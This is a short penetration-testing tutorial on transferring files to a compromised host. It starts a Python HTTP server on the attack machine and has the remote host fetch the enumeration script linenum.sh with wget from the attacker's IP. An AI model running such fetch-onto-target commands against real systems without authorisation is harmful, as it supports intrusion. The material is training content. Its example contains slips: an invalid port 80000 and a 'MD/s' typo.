# Transferring Files
During any penetration test exercise, it is likely that we will need to transfer files to a remote server, such as enumeration scripts or exploits, or transfer data back to our attack host.

While tools like Metasploit with a Meterpreter shell allow us to use the **Upload** command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

## Using wget
There are many methods to accomplish this. One method is running a Python HTTP server on our machine and then using wget or cURL to download the file on the remote host.

First we go into the directory that contains the file we need to transfer and run a Python HTTP server in it.

```
kieferhax@htb[/htb]$ cd /tmp
kieferhax@htb[/htb]$ python3 -m http.server 8000   

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

```
user@remotehost$ wget http://10.10.14.1:80000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[=======================>] 144.86K --.-KB/s in 0.02s

2021-02-08 18:09:19 (8.16 MD/s) - 'linenum.sh' saved [14337/14337]
```